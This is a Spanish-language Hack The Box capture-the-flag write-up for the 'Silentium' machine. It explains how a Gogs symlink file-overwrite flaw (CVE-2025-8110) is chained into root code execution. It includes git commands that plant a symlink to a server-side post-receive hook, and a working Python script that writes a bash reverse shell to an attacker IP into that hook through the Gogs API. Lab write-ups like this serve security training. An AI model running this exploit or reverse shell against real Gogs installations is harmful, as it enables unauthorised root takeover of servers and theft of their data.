# 🛡️ HTB Write-up: Silentium

![OS: Linux](https://img.shields.io/badge/OS-Linux-blue?style=flat&logo=linux)  
![Difficulty: Medium/Hard](https://img.shields.io/badge/Difficulty-Medium%2FHard-orange?style=flat)  
![Vulnerability: CVE-2025-8110](https://img.shields.io/badge/CVE-2025--8110-Critical-red?style=flat)

Un análisis detallado de la explotación de la máquina **Silentium** en Hack The Box. El vector principal se centra en la explotación de **Gogs** abusando de enlaces simbólicos (Symlinks) y Git Hooks, encadenado con una escalada de privilegios debido a una mala configuración del servicio.

* * *

## 📝 Resumen de la Vulnerabilidad

- **Servicio Vulnerable:** Gogs (Servicio Git autohospedado).
- **CVE:** [CVE-2025-8110](https://nvd.nist.gov/vuln/detail/CVE-2025-8110) - Arbitrary File Overwrite vía Symlink.
- **Causa Raíz (Escalada):** El servicio web de Gogs se ejecutaba con privilegios de `root` en lugar de un usuario sin privilegios (ej. `git`), permitiendo que la ejecución de código remoto (RCE) resultante tuviera impacto total en el sistema.

* * *

## 👣 Cadena de Explotación (Kill Chain)

### 1\. Enumeración Interna (Post-Acceso)

Tras obtener acceso inicial por SSH como el usuario `ben`, la enumeración de procesos reveló que Gogs operaba con privilegios máximos:

```bash
ps aux | grep gogs
# Resultado: root  1507  ... /opt/gogs/gogs/gogs web		
```

&nbsp;

Al inspeccionar el archivo de configuración en `/opt/gogs/gogs/custom/conf/app.ini`, se descubrió la ruta absoluta del repositorio: `ROOT_PATH = /root/gogs-repositories`

### 2\. Construcción del "Puente" (Symlink)

Para explotar el CVE, se requiere crear un enlace simbólico que apunte al archivo objetivo en el servidor (en este caso, el hook `post-receive`). Esto se realiza desde la máquina atacante:

&nbsp;

# Inicializar repositorio local

```git
git init

# Crear el enlace apuntando al hook del servidor en la ruta de root
ln -s /root/gogs-repositories/<usuario>/<repositorio>.git/hooks/post-receive link_hook

# Subir al servidor
git add link_hook
git commit -m "Plantando puente"
git push origin master

```

&nbsp;

### 3\. Inyección del Payload (Bypass de Web UI)

Intentar subir el payload mediante la interfaz web falla (Error 500) porque Gogs procesa temporalmente los archivos en `/tmp`, rompiendo el symlink. La solución es abusar del endpoint `PutContents` de la **API de Gogs**, que escribe el contenido codificado en Base64 directamente a través del enlace.

### 4\. El Detonador (Trigger)

Con el payload inyectado en el archivo `post-receive`, se activa el *Git Hook* realizando un commit legítimo (ej. creando un archivo `trigger.txt` en la interfaz web). Al procesar el cambio, Gogs (corriendo como root) ejecuta la reverse shell.

&nbsp;

&nbsp;
💻 Script de Explotación (API Injector)
El siguiente script en Python automatiza el paso 3 (Inyección), saltándose las restricciones de la interfaz web:

```Python
import requests
import base64

# Configuración
API_TOKEN = "TU_API_TOKEN"
USER = "tu_usuario"
REPO = "tu_repositorio"
FILE = "link_hook"
LHOST = "10.10.14.69" # IP Atacante
LPORT = "5555"

URL = f"http://localhost:3001/api/v1/repos/{USER}/{REPO}/contents/{FILE}"
headers = {"Authorization": f"token {API_TOKEN}", "Content-Type": "application/json"}

# 1. Obtener SHA del archivo
res_get = requests.get(URL, headers=headers)
sha = res_get.json().get("sha")

if sha:
    # 2. Payload en Base64
    payload = f"#!/bin/bash\nbash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1\n"
    b64_payload = base64.b64encode(payload.encode()).decode('utf-8')

    data = {
        "message": "API Pwn",
        "content": b64_payload,
        "sha": sha
    }

    # 3. Inyectar
    res_put = requests.put(URL, headers=headers, json=data)
    if res_put.status_code == 201:
        print("[+] ¡Éxito! Payload inyectado. Realiza un commit en la web para obtener la shell.")
